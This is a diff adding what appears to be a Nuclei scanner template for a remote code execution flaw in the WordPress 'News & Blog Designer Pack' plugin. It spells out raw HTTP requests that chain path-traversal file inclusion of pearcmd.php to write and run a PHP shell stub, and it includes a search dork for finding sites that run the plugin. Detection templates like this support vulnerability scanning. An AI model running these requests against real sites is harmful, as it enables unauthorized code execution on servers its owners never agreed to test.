@@ -1,0 +1,50 @@
+id: blog-designer-pack-rce
+
+info:
+  name: News & Blog Designer Pack < 3.4.2 - Remote Code Execution
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: critical
+  description: |
+    News & Blog Designer Pack contains a local file inclusion vulnerability via user controlled $design variable extracted by POST parameter 'shrt_param' leading to Remote Code Execution via pearcmd.php. The vulnerability occurs within bdp_get_more_post function inside file bdp-ajax-functions.php.
+  reference:
+    - https://twitter.com/frycos/status/1717571552470819285
+    - https://wordpress.org/plugins/blog-designer-pack/
+  metadata:
+    verified: true
+    max-request: 3
+    google-query: inurl:"/wp-content/plugins/blog-designer-pack/"
+  tags: wordpress,wp-plugin,lfi,wp,blogdesignerpack,rce,intrusive
+variables:
+  randomstr: "{{randstr_1}}"
+  marker: "{{base64(randomstr)}}"
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=bdp_get_more_post
+      - |
+        POST /wp-admin/admin-ajax.php?+config-create+/&/<?=base64_decode($_GET[0])?>+/tmp/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        &action=bdp_get_more_post&shrt_param[design]=../../../../../../../../usr/local/lib/php/pearcmd
+      - |
+        POST /wp-admin/admin-ajax.php?0={{marker}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        &action=bdp_get_more_post&shrt_param[design]=../../../../../../../../tmp/{{randstr}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_1, "\"success\":0")'
+          - 'contains(body_2,"channel pear.php.net")'
+          - 'contains_all(body_3, "{{randomstr}}", "success\":1")'
+          - 'contains(header_3, "application/json")'
+        condition: and
+# digest: 4a0a00473045022100c593b9bc326ce79f6098cd8035745af75605decf3f76c70a6a8db0ed53bc2e920220659c7d2dbc69ec82aef1151dcb5568092b8cc4775693219dd7a49f6c599ecc29:922c64590222798bb761d5b6d8e72950
